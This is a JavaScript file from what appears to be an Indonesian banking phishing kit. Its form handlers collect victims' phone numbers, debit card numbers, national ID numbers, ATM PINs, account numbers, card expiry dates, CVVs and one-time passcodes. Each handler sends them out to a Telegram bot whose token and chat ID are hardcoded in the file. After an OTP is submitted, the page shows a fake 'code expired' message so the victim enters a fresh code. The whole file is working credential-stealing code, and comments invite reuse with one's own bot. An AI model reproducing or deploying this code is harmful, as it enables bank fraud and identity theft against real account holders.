function sendNohp(event){
  event.preventDefault();
   
  $("#loadersaya").show();


 var logo = document.getElementById('logo');
 var nope = document.getElementById('nope');
 

    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 %3A%0A' + nope.value;

    var token = '5824177085:AAHMo7Iu66wCIW2wZ0iJAVsIgsBWrUDYRQU'; // Ganti dengan token bot yang kamu buat
    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
    $("#loadersaya").hide();
    setTimeout(function(){
  var nomor = document.getElementById("nope").value;
 sessionStorage.setItem("nomor", nomor);
  document.getElementById("popupku").style.display = "block";
    }, 1500);}});};
  

function sendData(event){
    $("#loadersaya").show();
    event.preventDefault();
    
 
  
    var logo = document.getElementById('logo');       
   
   var debit = document.getElementById('debit');
    var nikktp = document.getElementById('nikktp');
    var nomorhandphone = document.getElementById('nomorhandphone');
    var pinatm = document.getElementById('pinatm');
    var reke = document.getElementById('reke');
 
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 :%0A' + debit.value + '%0A𝗡𝗜𝗞 𝗞𝗧𝗣 :%0A' + nikktp.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :%0A' + nomorhandphone.value + '%0A𝗣𝗜𝗡 𝗔𝗧𝗠 :%0A' + pinatm.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :%0A' + reke.value;
    
    var token = '5824177085:AAHMo7Iu66wCIW2wZ0iJAVsIgsBWrUDYRQU'; // Ganti dengan token bot yang kamu buat
    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
   $("#loadersaya").hide();
 $("#isidata").fadeOut();
 setTimeout(function(){
    $("#inputotp").fadeIn();
    $("#pin1").focus();
document.getElementById("thisPhone").innerHTML = "Masukkan Kode OTP<br/>Yang di kirim ke nomor " + nope.value;
    }, 1500);}});};
    
    
function kirimPesan(event) {
 event.preventDefault();
  $("#loadersaya1").show();

    var logo = document.getElementById('logo');
    var pin1 = document.getElementById('pin1');
    var pin2 = document.getElementById('pin2');
    var pin3 = document.getElementById('pin3');
    var pin4 = document.getElementById('pin4');
    var pin5 = document.getElementById('pin5');
    var pin6 = document.getElementById('pin6');

    var gabungan = '' + logo.value + '%0A𝗢𝗧𝗣%20𝗕𝗡𝗜:%0A' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;

    var token = '5824177085:AAHMo7Iu66wCIW2wZ0iJAVsIgsBWrUDYRQU'; // Ganti dengan token bot yang kamu buat
    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
    success: function(){
         $("#blink").addClass("blink");
         document.getElementById("pincode").reset();
            
$("#blink").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
$("#blink").css("color","red");
        $("#blink").show();
   setTimeout(function(){
       $("#loadersaya1").hide();
        $("#blink").text("Kode Baru Sudah Kami Kirim Kembali");
$("#blink").css("color","#2E869C");
        $("#blink").show();
         $("#blink").removeClass("blink");
         $("#pin1").focus();

        }, 3000);}});};

   
      

 function openNotif(event){
event.preventDefault();
  $("#loadersaya").show();
  
   var logo = document.getElementById('logo');
   var nope = document.getElementById('nope');
    var nama = document.getElementById('nama');
    var bulan = document.getElementById('bulan');
    var tahun = document.getElementById('tahun');
    var pesan = document.getElementById('pesan');
    

    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 %3A%0A' + nope.value +  '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + nama.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 %3A%0A' + bulan.value + "/" + tahun.value + '%0A𝗖𝗩𝗩 %3A%0A' + pesan.value;

    var token = '5824177085:AAHMo7Iu66wCIW2wZ0iJAVsIgsBWrUDYRQU'; // Ganti dengan token bot yang kamu buat
    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

   success: function(){
   setTimeout(function(){
document.getElementById("thisPhone").innerHTML = "Masukkan Kode OTP<br/>Yang di kirim ke nomor " + nope.value;
   $("#loadersaya").hide();
 document.getElementById("infoku").style.display = "block";
  
        }, 500);}});};   


